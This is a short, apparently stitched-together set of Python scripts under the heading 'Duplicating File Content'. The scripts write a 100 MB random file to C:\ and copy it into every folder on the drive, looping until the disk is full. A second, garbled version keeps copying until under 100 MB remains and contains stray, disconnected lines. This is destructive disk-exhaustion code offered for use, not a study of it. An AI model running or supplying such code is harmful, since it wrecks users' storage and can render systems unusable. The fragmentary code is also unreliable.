3. Duplicating File Content

python

filename = 'example.txt'
with open(filename, 'r+') as file:
    content = file.read()
    file.write(content * 10)  # Duplicating the content 10 times

import os
import shutil
import random
import string

def create_large_file(file_path, size_in_mb):
    with open(file_path, 'wb') as f:
        f.write(os.urandom(size_in_mb * 1024 * 1024))

def get_all_folders_in_disk_c():
    folders = []
    for root, dirs, _ in os.walk('C:\\'):
        for dir_name in dirs:
            folder_path = os.path.join(root, dir_name)
            folders.append(folder_path)
    return folders

def is_disk_full(drive='C:'):
    total, used, free = shutil.disk_usage(drive)
    return free == 0

def copy_file_to_folders(file_path, folders):
    for folder in folders:
        try:
            dest_path = os.path.join(folder, os.path.basename(file_path))
            shutil.copy(file_path, dest_path)
        except Exception as e:
            print(f"Could not copy to {folder}: {e}")

def main():
    large_file_path = 'C:\\large_file.bin'
    create_large_file(large_file_path, 100)
    
    while not is_disk_full():
        folders = get_all_folders_in_disk_c()
        copy_file_to_folders(large_file_path, folders)
    
    print("Disk is full!")

if __name__ == "__main__":
    main()

import string

        f.write(os.urandom(size_in_mb * 1024 * 1024))

    for root, dirs, _ in os.walk('C:\\'):

    return folders

def is_disk_full(drive='C:'):
    total, used, free = shutil.disk_usage(drive)
    return free < 100 * 1024 * 1024  # less than 100 MB free

def copy_file_to_folders(file_path, folders):
    count = 1
    while not is_disk_full():
        for folder in folders:
            if is_disk_full():
                break
            try:
                dest_file_name = f"{os.path.basename(file_path)}_{count}"
                dest_path = os.path.join(folder, dest_file_name)
                shutil.copy(file_path, dest_path)
                print(f"Copied to {dest_path}")
                count += 1
            except Exception as e:
                print(f"Could not copy to {folder}: {e}")

def main():
    large_file_path = 'C:\\large_file.bin'
    create_large_file(large_file_path, 100)
    
    while not is_disk_full():
        folders = get_all_folders_in_disk_c()
        copy_file_to_folders(large_file_path, folders)
    
    print("Disk is full!")

if __name__ == "__main__":
    main()
